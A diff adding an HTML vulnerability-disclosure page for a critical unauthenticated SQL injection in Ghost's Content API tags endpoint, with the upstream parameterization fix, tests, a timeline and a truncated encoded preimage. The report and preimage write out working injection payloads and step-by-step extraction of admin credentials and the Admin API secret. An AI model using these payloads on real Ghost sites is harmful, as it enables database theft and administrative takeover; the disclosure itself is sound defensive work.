@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ANT-2026-69D8H6RP · tryghost/ghost</title>
+<link rel="icon" type="image/x-icon" href="/anthropic-serve/favicon.ico">
+<script>(function(){try{var t=localStorage.getItem("cvd_theme");if(t==="light"||t==="dark")document.documentElement.setAttribute("data-theme",t);}catch(e){}})();</script>
+<link rel="stylesheet" href="../assets/site.css">
+<link rel="stylesheet" href="../assets/ledger.css">
+</head>
+<body>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MT0111843S"></script><script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag() { dataLayer.push(arguments); }
+  gtag('js', new Date());
+  gtag('config', 'G-MT0111843S');
+</script>
+<main>
+<h1>ANT-2026-69D8H6RP · tryghost/ghost</h1>
+<nav class="site-nav muted">
+<a href="../index.html">Overview</a>  ·
+<a href="../ledger/index.html">Ledger</a>  ·
+<a href="../archive/index.html">Archive</a>  ·
+<a href="../about/index.html">About</a>  <span class="theme-toggle">
+    <button type="button" data-set-theme="light">Light</button>
+    <button type="button" data-set-theme="dark">Dark</button>
+    <button type="button" data-set-theme="system">System</button>
+  </span>
+</nav>
+<h2>
+  query-injection
+  <span class="sev-badge sev-critical">critical</span>
+</h2>
+
+<p class="id-badges">
+  <a class="id-badge" href="https://nvd.nist.gov/vuln/detail/CVE-2026-26980">CVE-2026-26980</a>
+  <a class="id-badge" href="https://github.com/advisories/GHSA-w52v-v783-gw97">GHSA-w52v-v783-gw97</a>
+</p>
+
+<p class="sev-compare">
+  <span class="sev-compare-label">Severity</span>
+  <span class="sev-compare-item">Claude <span class="sev-chip sev-critical">critical</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Security research firm <span class="sev-chip sev-unknown">-</span></span>
+  <span class="sev-compare-sep">·</span>
+  <span class="sev-compare-item">Maintainer <span class="sev-chip sev-critical">critical</span></span>
+</p>
+
+
+
+<div class="marker">REPORT</div>
+<p class="section-intro">Anthropic's analysis of this finding, sealed at approval.</p>
+<div class="report-body" tabindex="0"><h1>ANT-2026-69D8H6RP: Critical Vulnerability (CVSS 9.1) : SQLi from unauthenticated user; arbitrary DB reads</h1>
+<p>Ghost's Content API input serializer (slugFilterOrder in slug-filter-order.js) builds a raw SQL ORDER BY clause using string template literals containing the unsanitized <code>filter</code> query parameter. An attacker with only the public Content API key — which is embedded in the site's HTML as <code>data-key</code> — can craft a <code>filter=...slug:[...]</code> value on the /ghost/api/content/tags/ endpoint that injects arbitrary SQL. Using a boolean/error-based oracle (json(char(123)) on SQLite, SLEEP on MySQL), the attacker can exfiltrate arbitrary database rows bit-by-bit with no authentication. A working PoC extracts the admin email, bcrypt password hash, and Admin API secret in ~2600 requests; the leaked Admin API secret then grants full administrative control (create admin users, upload themes, manage all content).</p>
+<h2>Target</h2>
+<p><strong>Project:</strong> tryghost/ghost<br>
+<strong>Version:</strong> Ghost 6.x through 6.18.2 (latest)<br>
+<strong>Location:</strong> <code>core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js (slugFilterOrder)</code>  </p>
+<h2>Technical Details</h2>
+<p>slugFilterOrder takes the <code>filter</code> query parameter from the request and concatenates it into a raw SQL ORDER BY clause via a JavaScript template literal without escaping or parameterization. Because the Content API tags route is reachable with only the publicly-exposed Content API key, any remote visitor can inject SQL subexpressions into the ORDER BY. The PoC uses a CASE expression whose ELSE branch evaluates json('{') — malformed JSON that raises SQLITE_ERROR — turning the endpoint into a boolean oracle for arbitrary subqueries against the users and api_keys tables.</p>
+<h2>Reproduction</h2>
+<ol>
+<li>Load the Ghost front-end and extract the Content API key from the <code>data-key</code> attribute in the page source.</li>
+<li>Call /ghost/api/content/tags/?key=KEY&amp;fields=id,slug&amp;limit=1 to obtain a valid tag ID.</li>
+<li>Request /ghost/api/content/tags/?key=KEY&amp;filter=id:TAG_ID,slug:[' OR (SELECT CASE WHEN () THEN 1 ELSE json(char(123)) END) &gt; 0 OR slug=']&amp;limit=all — a TRUE condition returns tag JSON, a FALSE condition returns a SQLITE_ERROR BadRequestError.</li>
+<li>Iterate the boolean oracle over subqueries (e.g. SELECT email/password FROM users, SELECT secret FROM api_keys) to extract values character-by-character; on MySQL substitute a time-based distinguisher such as SLEEP().</li>
+<li>Use the recovered Admin API secret to authenticate to the Admin API and create admin users / upload themes.</li>
+</ol>
+<p><em>[No reproducer or sanitizer output attached — request from security-cvd@anthropic.com if needed.]</em></p>
+<h2>Acknowledgement</h2>
+<p>This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-69D8H6RP.</p>
+<hr>
+<p><strong>Reference:</strong> ANT-2026-69D8H6RP<br>
+<strong>Anthropic CVD Policy:</strong> https://www.anthropic.com/coordinated-vulnerability-disclosure</p></div>
+
+
+
+<div class="marker">UPSTREAM FIX</div>
+<p class="section-intro">The change that resolved this finding.</p>
+<div class="diff-block"><pre class="diff" tabindex="0"><code><span class="diff-h">diff --git a/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js b/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js</span>
+<span class="diff-h">index 93a900d8e06..94f92ce1227 100644</span>
+<span class="diff-h">--- a/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js</span>
+<span class="diff-h">+++ b/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js</span>
+<span class="diff-h">@@ -3,15 +3,18 @@ const slugFilterOrder = (table, filter) =&gt; {</span>
+<span class="diff-c"> </span>
+<span class="diff-c">     if (orderMatch) {</span>
+<span class="diff-c">         let orderSlugs = orderMatch[1].split(&#x27;,&#x27;);</span>
+<span class="diff-d">-        let order = &#x27;CASE &#x27;;</span>
+<span class="diff-a">+        let caseParts = [];</span>
+<span class="diff-a">+        let bindings = [];</span>
+<span class="diff-c"> </span>
+<span class="diff-c">         orderSlugs.forEach((slug, index) =&gt; {</span>
+<span class="diff-d">-            order += `WHEN \`${table}\`.\`slug\` = &#x27;${slug}&#x27; THEN ${index} `;</span>
+<span class="diff-a">+            caseParts.push(`WHEN \`${table}\`.\`slug\` = ? THEN ?`);</span>
+<span class="diff-a">+            bindings.push(slug.trim(), index);</span>
+<span class="diff-c">         });</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-        order += &#x27;END ASC&#x27;;</span>
+<span class="diff-d">-</span>
+<span class="diff-d">-        return order;</span>
+<span class="diff-a">+        return {</span>
+<span class="diff-a">+            sql: `CASE ${caseParts.join(&#x27; &#x27;)} END ASC`,</span>
+<span class="diff-a">+            bindings</span>
+<span class="diff-a">+        };</span>
+<span class="diff-c">     }</span>
+<span class="diff-c"> };</span>
+<span class="diff-c"> </span>
+<span class="diff-h">diff --git a/ghost/core/core/server/models/base/plugins/crud.js b/ghost/core/core/server/models/base/plugins/crud.js</span>
+<span class="diff-h">index be67979ff26..2eb6045a6d6 100644</span>
+<span class="diff-h">--- a/ghost/core/core/server/models/base/plugins/crud.js</span>
+<span class="diff-h">+++ b/ghost/core/core/server/models/base/plugins/crud.js</span>
+<span class="diff-h">@@ -101,7 +101,12 @@ module.exports = function (Bookshelf) {</span>
+<span class="diff-c">                 options.order = order;</span>
+<span class="diff-c">                 options.eagerLoad = eagerLoad;</span>
+<span class="diff-c">             } else if (options.autoOrder) {</span>
+<span class="diff-d">-                options.orderRaw = options.autoOrder;</span>
+<span class="diff-a">+                if (typeof options.autoOrder === &#x27;object&#x27;) {</span>
+<span class="diff-a">+                    options.orderRaw = options.autoOrder.sql;</span>
+<span class="diff-a">+                    options.orderRawBindings = options.autoOrder.bindings;</span>
+<span class="diff-a">+                } else {</span>
+<span class="diff-a">+                    options.orderRaw = options.autoOrder;</span>
+<span class="diff-a">+                }</span>
+<span class="diff-c">             } else if (this.orderDefaultRaw) {</span>
+<span class="diff-c">                 options.orderRaw = this.orderDefaultRaw(options);</span>
+<span class="diff-c">             } else if (this.orderDefaultOptions) {</span>
+<span class="diff-h">diff --git a/ghost/core/package.json b/ghost/core/package.json</span>
+<span class="diff-h">index dbcdb2e0cef..7369bffd63f 100644</span>
+<span class="diff-h">--- a/ghost/core/package.json</span>
+<span class="diff-h">+++ b/ghost/core/package.json</span>
+<span class="diff-h">@@ -72,7 +72,7 @@</span>
+<span class="diff-c">     &quot;@tryghost/adapter-base-cache&quot;: &quot;0.1.17&quot;,</span>
+<span class="diff-c">     &quot;@tryghost/admin-api-schema&quot;: &quot;4.5.10&quot;,</span>
+<span class="diff-c">     &quot;@tryghost/api-framework&quot;: &quot;1.0.3&quot;,</span>
+<span class="diff-d">-    &quot;@tryghost/bookshelf-plugins&quot;: &quot;0.6.27&quot;,</span>
+<span class="diff-a">+    &quot;@tryghost/bookshelf-plugins&quot;: &quot;0.6.29&quot;,</span>
+<span class="diff-c">     &quot;@tryghost/color-utils&quot;: &quot;0.2.10&quot;,</span>
+<span class="diff-c">     &quot;@tryghost/config-url-helpers&quot;: &quot;1.0.17&quot;,</span>
+<span class="diff-c">     &quot;@tryghost/custom-fonts&quot;: &quot;1.0.2&quot;,</span>
+<span class="diff-h">diff --git a/ghost/core/test/e2e-api/content/tags.test.js b/ghost/core/test/e2e-api/content/tags.test.js</span>
+<span class="diff-h">index 0547e221c7a..83e9ca2db44 100644</span>
+<span class="diff-h">--- a/ghost/core/test/e2e-api/content/tags.test.js</span>
+<span class="diff-h">+++ b/ghost/core/test/e2e-api/content/tags.test.js</span>
+<span class="diff-h">@@ -126,6 +126,20 @@ describe(&#x27;Tags Content API&#x27;, function () {</span>
+<span class="diff-c">         assert(getTag(&#x27;chorizo&#x27;).url.endsWith(&#x27;/tag/chorizo/&#x27;));</span>
+<span class="diff-c">     });</span>
+<span class="diff-c"> </span>
+<span class="diff-a">+    it(&#x27;Can request tags with slug filter ordering&#x27;, async function () {</span>
+<span class="diff-a">+        const res = await request.get(localUtils.API.getApiQuery(`tags/?key=${validKey}&amp;filter=slug:[bacon,chorizo]`))</span>
+<span class="diff-a">+            .set(&#x27;Origin&#x27;, testUtils.API.getURL())</span>
+<span class="diff-a">+            .expect(&#x27;Content-Type&#x27;, /json/)</span>
+<span class="diff-a">+            .expect(&#x27;Cache-Control&#x27;, testUtils.cacheRules.public)</span>
+<span class="diff-a">+            .expect(200);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+        const jsonResponse = res.body;</span>
+<span class="diff-a">+        assertExists(jsonResponse.tags);</span>
+<span class="diff-a">+        // Should return tags matching the slug filter, ordered by slug position</span>
+<span class="diff-a">+        assert.equal(jsonResponse.tags[0].slug, &#x27;bacon&#x27;);</span>
+<span class="diff-a">+        assert.equal(jsonResponse.tags[1].slug, &#x27;chorizo&#x27;);</span>
+<span class="diff-a">+    });</span>
+<span class="diff-a">+</span>
+<span class="diff-c">     it(&#x27;Can use single url field and have valid url fields&#x27;, async function () {</span>
+<span class="diff-c">         const res = await request.get(localUtils.API.getApiQuery(`tags/?key=${validKey}&amp;fields=url`))</span>
+<span class="diff-c">             .set(&#x27;Origin&#x27;, testUtils.API.getURL())</span>
+<span class="diff-h">diff --git a/ghost/core/test/unit/api/endpoints/utils/serializers/input/utils/slug-filter-order.test.js b/ghost/core/test/unit/api/endpoints/utils/serializers/input/utils/slug-filter-order.test.js</span>
+<span class="diff-c">new file mode 100644</span>
+<span class="diff-h">index 00000000000..2af9af7726b</span>
+<span class="diff-h">--- /dev/null</span>
+<span class="diff-h">+++ b/ghost/core/test/unit/api/endpoints/utils/serializers/input/utils/slug-filter-order.test.js</span>
+<span class="diff-h">@@ -0,0 +1,30 @@</span>
+<span class="diff-a">+const assert = require(&#x27;node:assert/strict&#x27;);</span>
+<span class="diff-a">+const slugFilterOrder = require(&#x27;../../../../../../../../core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order&#x27;);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+describe(&#x27;Unit: endpoints/utils/serializers/input/utils/slug-filter-order&#x27;, function () {</span>
+<span class="diff-a">+    it(&#x27;returns parameterized sql and bindings for slug filter&#x27;, function () {</span>
+<span class="diff-a">+        const result = slugFilterOrder(&#x27;tags&#x27;, &#x27;slug:[kitchen-sink,bacon,chorizo]&#x27;);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+        assert.equal(result.sql, &#x27;CASE WHEN `tags`.`slug` = ? THEN ? WHEN `tags`.`slug` = ? THEN ? WHEN `tags`.`slug` = ? THEN ? END ASC&#x27;);</span>
+<span class="diff-a">+        assert.deepEqual(result.bindings, [&#x27;kitchen-sink&#x27;, 0, &#x27;bacon&#x27;, 1, &#x27;chorizo&#x27;, 2]);</span>
+<span class="diff-a">+    });</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+    it(&#x27;returns undefined when filter has no slug array&#x27;, function () {</span>
+<span class="diff-a">+        const result = slugFilterOrder(&#x27;tags&#x27;, &#x27;status:published&#x27;);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+        assert.equal(result, undefined);</span>
+<span class="diff-a">+    });</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+    it(&#x27;trims whitespace from slug values&#x27;, function () {</span>
+<span class="diff-a">+        const result = slugFilterOrder(&#x27;posts&#x27;, &#x27;slug:[ foo , bar ]&#x27;);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+        assert.deepEqual(result.bindings, [&#x27;foo&#x27;, 0, &#x27;bar&#x27;, 1]);</span>
+<span class="diff-a">+    });</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+    it(&#x27;handles single slug&#x27;, function () {</span>
+<span class="diff-a">+        const result = slugFilterOrder(&#x27;posts&#x27;, &#x27;slug:[only-one]&#x27;);</span>
+<span class="diff-a">+</span>
+<span class="diff-a">+        assert.equal(result.sql, &#x27;CASE WHEN `posts`.`slug` = ? THEN ? END ASC&#x27;);</span>
+<span class="diff-a">+        assert.deepEqual(result.bindings, [&#x27;only-one&#x27;, 0]);</span>
+<span class="diff-a">+    });</span>
+<span class="diff-a">+});</span>
+<span class="diff-h">diff --git a/yarn.lock b/yarn.lock</span>
+<span class="diff-h">index 8c1fed2338a..7693d836a04 100644</span>
+<span class="diff-h">--- a/yarn.lock</span>
+<span class="diff-h">+++ b/yarn.lock</span>
+<span class="diff-h">@@ -8699,95 +8699,95 @@</span>
+<span class="diff-c">     json-stable-stringify &quot;1.3.0&quot;</span>
+<span class="diff-c">     lodash &quot;4.17.23&quot;</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-&quot;@tryghost/bookshelf-collision@^0.1.48&quot;:</span>
+<span class="diff-d">-  version &quot;0.1.48&quot;</span>
+<span class="diff-d">-  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-collision/-/bookshelf-collision-0.1.48.tgz#3490c7ac46959e43571b402f3b75aa3b1e7d608b&quot;</span>
+<span class="diff-d">-  integrity sha512-JaOVHE8JJ3aVzCba55erGxNqyC9MHUnJhxPgn/XOb64JYcfU1tR+5VvPfxvQTBy9bIjhmVeedlp1CWdWzpCUxw==</span>
+<span class="diff-a">+&quot;@tryghost/bookshelf-collision@^0.1.49&quot;:</span>
+<span class="diff-a">+  version &quot;0.1.49&quot;</span>
+<span class="diff-a">+  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-collision/-/bookshelf-collision-0.1.49.tgz#f3e15954446d89ae867e40a1bb488be1d7c65d38&quot;</span>
+<span class="diff-a">+  integrity sha512-WW2+Uk6h7nEL5cW2BOaoDMLZeWuur+PEXV726JpH4vQK9D7UQcHwRQW7CBu+NW6tMbjWkhPPp4q0lBKdoosusQ==</span>
+<span class="diff-c">   dependencies:</span>
+<span class="diff-d">-    &quot;@tryghost/errors&quot; &quot;^1.3.8&quot;</span>
+<span class="diff-a">+    &quot;@tryghost/errors&quot; &quot;^1.3.9&quot;</span>
+<span class="diff-c">     lodash &quot;^4.17.21&quot;</span>
+<span class="diff-c">     moment-timezone &quot;^0.5.33&quot;</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-&quot;@tryghost/bookshelf-custom-query@^0.1.30&quot;:</span>
+<span class="diff-d">-  version &quot;0.1.30&quot;</span>
+<span class="diff-d">-  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-custom-query/-/bookshelf-custom-query-0.1.30.tgz#178cd56db9a86ae20bef3029bdfd229c3f7b7ba2&quot;</span>
+<span class="diff-d">-  integrity sha512-OTExkXpRZ26JXMBNUV9A0MNtQpx3wZvohaAKk/hA8NtjwjX82IXOfG/L78Dex/iolewBZhSKjpC33vnFKvChmA==</span>
+<span class="diff-a">+&quot;@tryghost/bookshelf-custom-query@^0.1.31&quot;:</span>
+<span class="diff-a">+  version &quot;0.1.31&quot;</span>
+<span class="diff-a">+  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-custom-query/-/bookshelf-custom-query-0.1.31.tgz#9bea3f73168224a42f2bf312ce3e939977ed2085&quot;</span>
+<span class="diff-a">+  integrity sha512-HZs/WnNQpKLG+nkBSbe+wsi1WP+jq56wiIZCnbWTfX3xKFqLh+QRtkmgvJCpyd9iEgexWzodmyIZY3th3sv6wA==</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-&quot;@tryghost/bookshelf-eager-load@^0.1.34&quot;:</span>
+<span class="diff-d">-  version &quot;0.1.34&quot;</span>
+<span class="diff-d">-  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-eager-load/-/bookshelf-eager-load-0.1.34.tgz#894756cc8a5d7f4d5ef89717947adaddcd6e20c9&quot;</span>
+<span class="diff-d">-  integrity sha512-u7DSnnA+2MBc27B/EiyHx2t2tSQPFCsUHv45A95r/ETRvERZUySb5fKAb9PJlmvpD+qQ3SV7EsW3cERhIBUU6A==</span>
+<span class="diff-a">+&quot;@tryghost/bookshelf-eager-load@^0.1.35&quot;:</span>
+<span class="diff-a">+  version &quot;0.1.35&quot;</span>
+<span class="diff-a">+  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-eager-load/-/bookshelf-eager-load-0.1.35.tgz#b04e21e94ae9b24fde35194662f8f5d412f2c06a&quot;</span>
+<span class="diff-a">+  integrity sha512-8BkBxnETuoVoK48rlCdlCL0upTWwc1Ku21Wjfafor6kJDOO9DxsLDi/e0fNQxMTqgH0aWdWYDeyNAjHJgiNJJQ==</span>
+<span class="diff-c">   dependencies:</span>
+<span class="diff-d">-    &quot;@tryghost/debug&quot; &quot;^0.1.35&quot;</span>
+<span class="diff-a">+    &quot;@tryghost/debug&quot; &quot;^0.1.36&quot;</span>
+<span class="diff-c">     lodash &quot;^4.17.21&quot;</span>
+<span class="diff-c"> </span>
+<span class="diff-d">-&quot;@tryghost/bookshelf-filter@^0.5.23&quot;:</span>
+<span class="diff-d">-  version &quot;0.5.23&quot;</span>
+<span class="diff-d">-  resolved &quot;https://registry.yarnpkg.com/@tryghost/bookshelf-filter/-/bookshelf-filter-0.5.23.tgz#95a77343cb19c4b</span>
+<span class="diff-c">… (truncated)</span></code></pre></div>
+<p class="kicker"><a href="https://github.com/TryGhost/Ghost/commit/30868d632b2252b638bc8a4c8ebf73964592ed91" rel="noopener noreferrer">https://github.com/TryGhost/Ghost/commit/30868d632b2252b638bc8a4c8ebf73964592ed91</a></p>
+
+<div class="marker">ADVISORY</div>
+<p class="kicker"><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97" rel="noopener noreferrer">https://github.com/TryGhost/Ghost/security/advisories/GHSA-w52v-v783-gw97</a></p>
+
+<div class="marker">CONSOLIDATED FROM</div>
+<p class="section-intro">The following finding was consolidated into this one after publication; this card carries the shared disclosure record. Each original commitment remains in the ledger.</p>
+<p class="kicker"><a href="ANT-2026-H5T8XKWR.html">ANT-2026-H5T8XKWR</a></p>
+<p class="hash full">6479c89ca89975bde1a83168dcdaf7c0efffd8b9c3938659365bc7a4974131645c651422ea7bf38a531543cbeecea4d68d0743fa17e25e35e030028719e4c652</p>
+
+<div class="marker">TIMELINE</div>
+<p class="section-intro">Recorded dates, in order.</p>
+<div class="figure">
+  <ol class="timeline">
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-02-15</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-02-15</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-02-15</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-02-16</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-06-03</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">7531e6b7bcefdfe01e708e410a2531cc4c1096294dcaa1b1ee4404b6f52a4927719e80ff0ed9f4bc93f9bbd9e8db83d4892e680abd903298915fde98182208ef</p>
+<p class="kicker">Committed 2026-02-15 00:31 UTC</p>
+<p class="kicker">Revealed 2026-06-03 00:00 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-69D8H6RP-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-69D8H6RP%22%2C%22bug_class%22%3A%22SQL%20Injection%22%2C%22claude_severity%22%3A%22critical%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-05-14T22%3A41%3A22%2B00%3A00%22%2C%22description%22%3A%22Ghost%27s%20Content%20API%20input%20serializer%20%28slugFilterOrder%20in%20slug-filter-order.js%29%20builds%20a%20raw%20SQL%20ORDER%20BY%20clause%20using%20string%20template%20literals%20containing%20the%20unsanitized%20%60filter%60%20query%20parameter.%20An%20attacker%20with%20only%20the%20public%20Content%20API%20key%20%E2%80%94%20which%20is%20embedded%20in%20the%20site%27s%20HTML%20as%20%60data-key%60%20%E2%80%94%20can%20craft%20a%20%60filter%3D...slug%3A%5B...%5D%60%20value%20on%20the%20/ghost/api/content/tags/%20endpoint%20that%20injects%20arbitrary%20SQL.%20Using%20a%20boolean/error-based%20oracle%20%28json%28char%28123%29%29%20on%20SQLite%2C%20SLEEP%20on%20MySQL%29%2C%20the%20attacker%20can%20exfiltrate%20arbitrary%20database%20rows%20bit-by-bit%20with%20no%20authentication.%20A%20working%20PoC%20extracts%20the%20admin%20email%2C%20bcrypt%20password%20hash%2C%20and%20Admin%20API%20secret%20in%20~2600%20requests%3B%20the%20leaked%20Admin%20API%20secret%20then%20grants%20full%20administrative%20control%20%28create%20admin%20users%2C%20upload%20themes%2C%20manage%20all%20content%29.%22%2C%22discovered_at%22%3A%222026-02-15T00%3A31%3A39%2B00%3A00%22%2C%22location%22%3A%22core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js%20%28slugFilterOrder%29%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22TryGhost/Ghost%22%2C%22reproduction%22%3A%5B%221.%20Load%20the%20Ghost%20front-end%20and%20extract%20the%20Content%20API%20key%20from%20the%20%60data-key%60%20attribute%20in%20the%20page%20source.%22%2C%222.%20Call%20/ghost/api/content/tags/%3Fkey%3DKEY%26fields%3Did%2Cslug%26limit%3D1%20to%20obtain%20a%20valid%20tag%20ID.%22%2C%223.%20Request%20/ghost/api/content/tags/%3Fkey%3DKEY%26filter%3Did%3ATAG_ID%2Cslug%3A%5B%27%20OR%20%28SELECT%20CASE%20WHEN%20%28%3Ccond%3E%29%20THEN%201%20ELSE%20json%28char%28123%29%29%20END%29%20%3E%200%20OR%20slug%3D%27%5D%26limit%3Dall%20%E2%80%94%20a%20TRUE%20condition%20returns%20tag%20JSON%2C%20a%20FALSE%20condition%20returns%20a%20SQLITE_ERROR%20BadRequestError.%22%2C%224.%20Iterate%20the%20boolean%20oracle%20over%20subqueries%20%28e.g.%20SELECT%20email/password%20FROM%20users%2C%20SELECT%20secret%20FROM%20api_keys%29%20to%20extract%20values%20character-by-character%3B%20on%20MySQL%20substitute%20a%20time-based%20distinguisher%20such%20as%20SLEEP%28%29.%22%2C%225.%20Use%20the%20recovered%20Admin%20API%20secret%20to%20authenticate%20to%20the%20Admin%20API%20and%20create%20admin%20users%20/%20upload%20themes.%22%5D%2C%22technical_details%22%3A%22Hi%2C%5Cn%5CnI%20am%20a%20security%20researcher%20at%20Anthropic.%20I%20am%20using%20LLMs%20to%20find%5Cn%5Cnvulnerabilities%20in%20open%20source%20software%2C%20and%20have%20spent%20a%20little%20bit%20of%5Cn%5Cntime%20looking%20at%20Ghost.%20I%20believe%20I%20have%20found%20a%20bug%20that%20is%20extremely%5Cn%5Cnserious.%20While%20an%20LLM%20found%20this%20bug%20initially%2C%20I%20manually%20validated%20the%5Cn%5Cnbug%20myself%20and%20wrote%20this%20email%20and%20also%20tried%20to%20write%20a%20patch%20myself.%5Cn%5CnThe%20vulnerability%20is%20in%20the%20slugFilterOrder%20function%20in%5Cn%5Cncore/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js%5Cn%5Cn%3Chttps%3A//github.com/TryGhost/Ghost/blob/main/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js%3E%2C%5Cn%5Cnwhich%20directly%20takes%20user%20input%20from%20the%20filter%20query%20parameter%20and%5Cn%5Cnconstructs%20a%20raw%20SQL%20ORDER%20BY%20clause%20via%20string%20template%20literals.%5Cn%5CnUnfortunately%2C%20this%20leads%20to%20a%20SQLi%20that%20allows%20anyone%20to%20remotely%20read%5Cn%5Cnarbitrary%20data%20from%20the%20database.%20This%20is%20distinct%20from%20CVE-2026-22596%5Cn%5Cnwhich%20was%20recently%20filed.%5Cn%5CnI%20have%20a%20working%20PoC%2C%20attached%20to%20this%20email%2C%20that%20extracts%20the%20admin%5Cn%5Cnemail%2C%20bcrypt%20password%20hash%2C%20and%20even%20the%20Admin%20API%20secrets%20when%20running%20on%5Cn%5Cnthe%20latest%20Ghost%206.%20%28Note%20that%20an%20attacker%20with%20the%20extracted%20Admin%20API%5Cn%5Cnsecret%20can%20then%20create%20admin%20users%2C%20upload%20themes%2C%20and%20manage%20all%20content.%29%5Cn%5CnTo%20reproduce%2C%20start%20by%20running%20Ghost%20locally%20with%20Docker%3A%5Cn%5Cn%20%20docker%20run%20-d%20-p%202368%3A2368%20ghost%3Alatest%5Cn%5CnThis%20should%20bring%20up%20Ghost%20version%206.18.2.%20From%20here%20you%20should%20be%20able%20to%5Cn%5Cnvisit%5Cn%5Cn%20%20http%3A//localhost%3A2368%5Cn%5CnInspect%20the%20source%20code%20and%20find%20the%20data-key%2C%20this%20will%20look%20like%5Cn%5Cn%20%20data-key%3D%5C%22bd6a3bb3d48a98345e5bc45b5a%5C%22%5Cn%5CnThen%20figure%20out%20a%20valid%20tag%20ID%5Cn%5Cnhttp%3A//localhost%3A2368/ghost/api/content/tags/%3Fkey%3DYOUR_KEY%26fields%3Did%2Cslug%26limit%3D1%5Cn%5Cnthen%20visit%20these%20two%20URLs%20which%20behave%20differently%20and%20prove%20the%20SQLi%3A%5Cn%5Cnhttp%3A//localhost%3A2368/ghost/api/content/tags/%3Fkey%3DYOUR_KEY%26filter%3Did%3AYOUR_TAG_ID%2Cslug%3A%5B%27%5Cn%5CnOR%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20json%28char%28123%29%29%20END%29%20%3E%200%20OR%5Cn%5Cnslug%3D%27%5D%26limit%3Dall%5Cn%5Cnhttp%3A//localhost%3A2368/ghost/api/content/tags/%3Fkey%3DYOUR_KEY%26filter%3Did%3AYOUR_TAG_ID%2Cslug%3A%5B%27%5Cn%5CnOR%20%28SELECT%20CASE%20WHEN%20%281%3D0%29%20THEN%201%20ELSE%20json%28char%28123%29%29%20END%29%20%3E%200%20OR%5Cn%5Cnslug%3D%27%5D%26limit%3Dall%5Cn%5CnThe%20first%20of%20these%20requests%20will%20return%5Cn%5Cn%7B%5C%22tags%5C%22%3A%5B%7B%5C%22id%5C%22%3A%5C%2269917d0f084446000139092c%5C%22%2C%5C%22name%5C%22%3A%5C%22News%5C%22%2C%5C%22slug%5C%22%3A%5C%22news%5C%22%2C%5C%22description%5C%22%3Anull%2C%5C%22feature_image%5C%22%3Anull%2C%5C%22visibility%5C%22%3A%5C%22public%5C%22%2C%5C%22og_image%5C%22%3Anull%2C%5C%22og_title%5C%22%3Anull%2C%5C%22og_description%5C%22%3Anull%2C%5C%22twitter_image%5C%22%3Anull%2C%5C%22twitter_title%5C%22%3Anull%2C%5C%22twitter_description%5C%22%3Anull%2C%5C%22meta_title%5C%22%3Anull%2C%5C%22meta_description%5C%22%3Anull%2C%5C%22codeinjection_head%5C%22%3Anull%2C%5C%22codeinjection_foot%5C%22%3Anull%2C%5C%22canonical_url%5C%22%3Anull%2C%5C%22accent_color%5C%22%3Anull%2C%5C%22url%5C%22%3A%5C%22%5Cn%5Cnhttp%3A//localhost%3A2368/tag/news/%5Cn%5Cn%5C%22%7D%5D%2C%5C%22meta%5C%22%3A%7B%5C%22pagination%5C%22%3A%7B%5C%22page%5C%22%3A1%2C%5C%22limit%5C%22%3A100%2C%5C%22pages%5C%22%3A1%2C%5C%22total%5C%22%3A1%2C%5C%22next%5C%22%3Anull%2C%5C%22prev%5C%22%3Anull%7